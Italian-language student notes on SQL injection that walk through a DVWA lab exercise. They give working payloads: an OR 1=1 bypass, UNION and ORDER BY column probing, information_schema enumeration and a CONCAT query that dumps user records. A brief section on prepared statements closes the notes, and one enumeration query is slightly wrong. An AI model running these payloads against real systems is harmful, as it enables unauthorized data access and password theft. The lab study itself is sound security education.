# intro a sql

# tecniche sql injection
**error-based SQLinjection**: input e output sullo stesso canale. per esempio su una connessione http.
**out-of-band**: canali differenti per input e output.
**blind**: se non ho un canale di output, ossia di ritorno. per capire gli effetti sul server devo analizzare gli effetti collaterali sul server. posso usare `sleep` per avere un po di informazione su cosa succede.

**devo capire come funziona la query**:
1. individuo una textbox che fa una sql query
2. tento di capire se posso romperlo!

**esempio**: la query e' del tipo `SELECT Name, Surname FROM tabella WHERE ID='<form_id>'` dove possiamo modificare `<form_id>`. ==ATTENZIONE: `<form_id>` e' incapsulato dentro gli apici, dunque `form_id` e' interpretato come stirnga.==


**esempio injection**: nella textbox scrivo `1' OR 1=1 -- ` ==(ATTENZIONE ALLO SPAZIO DOPO `--`)== e mi ritorna tutti gli utenti.
* `1'` probabilmente l'input della textbox e' incapsulato dentro una stringa.
* **obiettivo**: uscire dall'incapsulamento della stringa per interpretare il mio input come comando SQL.

**leggere da altre tabelle con UNION**:
* **problema**: devo conoscere il numero di colonne
* **soluzione**: provo a fare la union con un numero arbitrario di colonne create ad hoc usando `SELECT 1`, `SELECT 1,2,...`.

**nell'esempio**: `'UNION SELECT 1 -- `mi da errore, ho solo 1 colonna.
**riprovando**: `'UNION SELECT 2 -- ` funziona!

**ora con** `ORDER BY`: `'ORDER BY 2 -- `posso ordinare le colonne.
**invece**: `'ORDER BY 3 -- ` non funziona, non ho 3 colonne nella query.

**cosa possiamo fare**? interrogare `information_scheme`, ossia la tabella con tutte le informazioni sulle tabelle presenti nel database.
* `SCHEMATA`: https://mariadb.com/docs/server/reference/system-tables/information-schema/information-schema-tables/information-schema-schemata-table
* `SCHEMA_NAME`: e' l'attributo che corrisponde ai nomi delle tabelle presenti nel sistema
* **OSS**: tutte le tabelle nel information-schema di mariadb sono elencate nel sito.

**otteniamo i nomi delle tabelle**: `'UNION SELECT SCHEMA_NAME, 2 FROM information_schema.SCHEMATA -- `

**per ottenere la tabella `dvwa`**: `' UNION SELECT TABLE_NAME, 2 FROM information_schema.TABLES WHERE SCHEMA_NAME = 'dvwa' -- `

**per ottenere le colonne della tabella `dvwa`**: `' UNION SELECT TABLE_NAME, 2 FROM information_schema.TABLES WHERE TABLE_SCHEMA = 'dvwa' -- `

**problema**: abbiamo tante colonne da leggere in `dvwa`, ma per via della query originale ne abbiamo solo due disponibili in output.
```bash
UNION SELECT CONCAT(user_id, "-", first_name), 2 FROM users -- 
```

COSI HO RISOLTO TUTTO E HO OTTENUTO LE PASSWORD FORZA LASIO.

## come si risolve???
**prepared statements**: quando programmo questi tipi di form devo fare aggiustare le query date in input. Ci faccio type check sopra.
* `prepare("SELECT ... (:id) ...")`: gli dico al parser qual'e' la mia query, dove `:id` e' un parametro che l'utente passa in input
* `bindParam(':id', $id, type)`: al posto di `:id` gli do l'input utente, viene passato in modo sicuro.

`LIMIT 1`: posso limitare il numero di risultati della query.




